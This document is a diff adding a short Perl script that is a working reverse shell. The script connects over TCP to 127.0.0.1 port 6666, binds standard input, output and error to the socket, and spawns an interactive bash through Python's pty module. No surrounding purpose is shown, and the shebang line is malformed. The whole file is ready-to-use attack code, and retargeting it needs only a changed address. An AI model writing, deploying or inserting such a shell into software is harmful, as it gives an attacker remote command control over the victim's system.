@@ -1,0 +1,15 @@
+#!/usr/env/perl
+
+use Socket;
+
+$ip="127.0.0.1";
+$port=6666;
+
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+
+if(connect(S,sockaddr_in($port,inet_aton($ip)))){
+    open(STDIN,">&S");
+    open(STDOUT,">&S");
+    open(STDERR,">&S");
+    exec("python -c 'import pty; pty.spawn([\"/bin/bash\", \"--noprofile\", \"--norc\"])'")
+};
